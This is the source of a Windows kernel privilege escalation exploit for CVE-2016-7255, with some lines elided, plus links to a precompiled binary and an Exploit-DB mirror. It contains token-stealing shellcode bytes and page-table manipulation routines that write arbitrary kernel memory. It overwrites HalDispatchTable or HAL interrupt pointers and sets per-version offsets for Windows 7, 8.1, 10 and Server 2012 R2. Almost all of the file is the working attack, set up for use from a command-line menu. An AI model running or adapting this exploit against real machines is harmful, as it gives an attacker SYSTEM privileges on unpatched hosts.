...
Binary: 
https://github.com/rlarabee/exploits/raw/8b9eb646516d7f022a010f28018209f331c28975/cve-2016-7255/compiled/cve-2016-7255.exe
Mirror: 
https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41015.exe
*/
...
// Credits: enrique.nissim@IOActive.com: 
https://github.com/IOActive/I-know-where-your-page-lives/tree/master/code/CVE-2016-7255
...
typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(IN 
...
typedef NTSTATUS (WINAPI *NtQueryIntervalProfile_t)(IN ULONG   
ProfileSource,
                                                    OUT PULONG 
Interval);
...
MOV RAX, Original Pointer
    0x50,                                                           // 
PUSH RAX
    0x51,                                                           // 
PUSH RCX
    0x48, 0xb9, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,     // 
MOV RCX, [OverwriteAddr+OverwriteOffset]
    0x48, 0x89, 0x01,                                               // 
MOV    QWORD PTR [RCX], RAX
    0xb9, 0x90, 0x90, 0x90, 0x90,                                   // 
MOV ECX, PID
    0x53,                                                           // 
PUSH RBX
...
MOV    RAX,QWORD PTR [RAX+0xb8] EPROCESS
    0x48, 0x8d, 0x80, 0x90, 0x90, 0x00, 0x00,                       // 
LEA    RAX,[RAX+0xActiveProcessLinkOffset] 
    //<tag>
    0x48, 0x8b, 0x00,                                               // 
...
CMP    RBX,0x4
    0x75, 0xf3,                                                     // 
JNE    <tag>
    0x48, 0x8b, 0x98, 0x90, 0x90, 0x90, 0x90,                       // 
MOV    RBX, QWORD PTR [RAX+0x60] // GET TOKEN of SYSTEM
...
JNE    <tag2>
    0x5b,                                                           // 
POP RBX
    0x48, 0x89, 0x98, 0x90, 0x90, 0x90, 0x90,                       // 
...
ULONG __cdecl DbgPrint(__in char* Format, ...)
{
    ...
    do
    {
        pszDbgBuff = (CHAR*)HeapAlloc(GetProcessHeap(), 0, 1024 * 
sizeof(CHAR));
        if (NULL == pszDbgBuff)
        {
            break;
...
UINT64 get_pxe_address(UINT64 address) {
    ...
    UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 
39);
    UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 
...
UINT64 create_spurious_pte_to_virtual_address(UINT64 virtual_address, 
BOOL patch_original) {
 
    /*
    1: kd> !pte ffffffff`ffd00000
    VA ffffffffffd00000
    PXE at FFFFF6FB7DBEDFF8    PPE at FFFFF6FB7DBFFFF8    PDE at 
FFFFF6FB7FFFFFF0    PTE at FFFFF6FFFFFFE800
    contains 0000000000A1F063  contains 0000000000A20063  contains 
0000000000A25063  contains 8000000000103963
    pfn a1f-- - DA--KWEV  pfn a20-- - DA--KWEV  pfn a25-- - DA--KWEV  
pfn 103 - G - DA--KW - V
    */ 
    ...
    printf("[+] Patching the Spurious Offset (PML4e) %llx: 
%llx\n",f_e_pml4, pml4e_pfn);
...
UINT64 get_OverwriteAddress_pointer(UINT64 target_address, int 
target_offset) {
    printf("[*] Getting Overwrite pointer: %llx\n", target_address);
    UINT64 OverwriteAddress = 
create_spurious_pte_to_virtual_address(target_address, FALSE);
    OverwriteAddress += (target_address & 0xFFF);
    printf("OverwriteAddress: %llx\n", OverwriteAddress);
    return (UINT64) *((PVOID *)(((char *)OverwriteAddress) + 
target_offset));
}
 
void overwrite_TargetAddress(UINT64 hook_address, UINT64 target_address, 
int target_offset) {
    UINT64 OverwriteTarget = 
create_spurious_pte_to_virtual_address(target_address, FALSE);
...
UINT64 store_shellcode_in_hal(void) {
    ...
    UINT64 hal_heap = 
create_spurious_pte_to_virtual_address(hal_heap_addr, TRUE);
...
(NtQuerySystemInformation_t)GetProcAddress(hNtDll, 
"NtQuerySystemInformation");
 
    if (!NtQuerySystemInformation) {
        printf("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 
0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 
0, &ReturnLength);
 
    // Allocate the Heap chunk
    pSystemModuleInformation = 
(PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
...
SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    ...
    if (NtStatus != STATUS_SUCCESS) {
        printf("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 
0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    KernelBaseAddressInKernelMode = 
pSystemModuleInformation->Module[0].Base;
    KernelImage = 
strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 
1;
...
GetLastError());
    ...
    HalDispatchTable = (UINT64)GetProcAddress(hKernelInUserMode, 
"HalDispatchTable");
...
GetLastError());
        ...
        HalDispatchTable = (ULONGLONG)HalDispatchTable - 
(ULONGLONG)hKernelInUserMode;
 
        // Here we get the address of HapDispatchTable in Kernel mode
        HalDispatchTable = ((ULONGLONG)HalDispatchTable + 
(ULONGLONG)KernelBaseAddressInKernelMode);
...
int __cdecl main(int argc, char** argv)
{
    ...
    if (argc != 2) {
        ...
        printf("\t[*] 10 - Windows 10 prior to build release 14393 
(Anniversary Update)\n");
        printf("\t[*] 12 - Windows 2012 R2\n");
        printf("\n");
        printf("\t[*] For example:  cve-2016-7255.exe 7    -- for 
Windows 7\n");
        return -1;
    }
    ...
    if(osversion == 7) 
    {
        ...
        sc_KPROCESS = 0x70;         // dt -r1 nt!_KTHREAD  +0x050 
ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x80;         // dt -r1 nt!_EPROCESS [+0x208 Token 
: _EX_FAST_REF] - [+0x188 ActiveProcessLinks : _LIST_ENTRY] = (0x80)
        sc_APLINKS  = 0x188;        // dt -r1 nt!_EPROCESS +0x188 
ActiveProcessLinks : _LIST_ENTRY
         
        overwrite_address = GetHalDispatchTable();  // HalDispatchTable
        overwrite_offset = 0x8;                     // 
QueryIntervalProfile        
    ...
    else if(osversion == 81)
    {
        ...
        printf("   [+] Windows 8.1\n");
        sc_KPROCESS = 0xB8;             // dt -r1 nt!_KTHREAD +0x098 
ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x60;             // dt -r1 nt!_EPROCESS [+0x348 
Token : _EX_FAST_REF] - [+0x2e8 ActiveProcessLinks : _LIST_ENTRY] = 
(0x60)
        sc_APLINKS  = 0x2e8;            // dt -r1 nt!_EPROCESS +0x2e8 
ActiveProcessLinks : _LIST_ENTRY
         
        overwrite_address = 0xffffffffffd00510;     // 
HalpInterruptController_address (dq poi(hal!HalpInterruptController))
        overwrite_offset = 0x78;                    // 
HalpApicRequestInterruptOffset (dq halpApicRequestInterrupt)
    }
    else if(osversion == 10)
    {
        ...
        sc_KPROCESS = 0xB8;             // dt -r1 nt!_KTHREAD +0x098 
ApcState : _KAPC_STATE -> +0x020 Process : Ptr64 _KPROCESS
        sc_TOKEN    = 0x68;             // dt -r1 nt!_EPROCESS [+0x358 
Token : _EX_FAST_REF] - [+0x2f0 ActiveProcessLinks : _LIST_ENTRY] = 
(0x60)
        sc_APLINKS  = 0x2f0;            // dt -r1 nt!_EPROCESS +0x2f0 
ActiveProcessLinks : _LIST_ENTRY
         
        overwrite_address = 0xffffffffffd004c0;     // 
HalpInterruptController_address (dq poi(hal!HalpInterruptController)
        overwrite_offset = 0x78;                    // 
HalpApicRequestInterruptOffset (dq halpApicRequestInterrupt)
    }
...
ActiveProcessLinks : _LIST_ENTRY
        ...
        overwrite_address = 0xffffffffffd12c70;     // 
HalpInterruptController_address (dq poi(hal!HalpInterruptController)
        overwrite_offset = 0x78;                    // 
HalpApicRequestInterruptOffset (dq halpApicRequestInterrupt)
    }
    // in case the OS version is not any of the previously checked 
versions
    else
    {
...
cve-2016-7255.exe 7\n");
        printf("         [*] Windows 8.1                   -- 
cve-2016-7255.exe 81\n");
        printf("         [*] Windows 10 before build 14393 -- 
cve-2016-7255.exe 10\n");
        printf("         [*] Windows 2012 R2               -- 
cve-2016-7255.exe 12\n");
    ...
    UINT64 original_pointer = 
get_OverwriteAddress_pointer(overwrite_address, overwrite_offset);
...
original_pointer);
    ...
    *(PVOID *)p = (PVOID)original_pointer; // Patch shellcode1
    ...
    p += 12; // Patch shellcode with original value in the Overwrite 
address
    ...
    *(unsigned int *)p = (unsigned int)sc_TOKEN;
    ...
    overwrite_TargetAddress(shellcode_va, overwrite_address, 
overwrite_offset);
...
(NtQueryIntervalProfile_t)GetProcAddress(hNtDll, 
"NtQueryIntervalProfile");
